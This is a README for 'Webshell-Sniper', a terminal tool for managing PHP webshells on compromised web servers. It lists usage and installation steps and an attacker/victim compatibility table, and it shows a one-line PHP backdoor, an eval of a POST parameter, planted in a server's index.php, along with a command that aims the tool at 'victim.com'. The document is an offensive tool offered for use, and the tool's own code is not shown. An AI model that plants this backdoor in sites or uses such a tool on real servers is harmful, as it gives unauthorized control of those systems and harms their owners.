# Webshell-Sniper
A webshell manager via terminal

#### Usage :
```
Usage : 
        python webshell-sniper.py [URL] [METHOD] [AUTH]
Example : 
        python webshell-sniper.py http://127.0.0.1/c.php POST c
Author : 
        ThreatCode <threatcodeer@gmail.com>
```
```
# cat /var/www/html/index.php
<?php eval($_POST['s3cr3t']);?>
# python webshell-sniper.py http://victim.com/index.php POST s3cr3t
...
```

#### Installation:
```
git clone https://github.com/ThreatCode/Webshell-Sniper
cd Webshell-Sniper
pip install -r requirements.txt
```

#### Example : 

> v1.1.2

#### Compatibility :
```
Enviroment :
    Attacker :
        Linux
        python 2.7
    Victim :
        apache 2.4
        php 7.0
```

#### Addations:
1. This tool only support to run on unix-like system.
2. It is able to help user control web server which is running PHP or MySQL.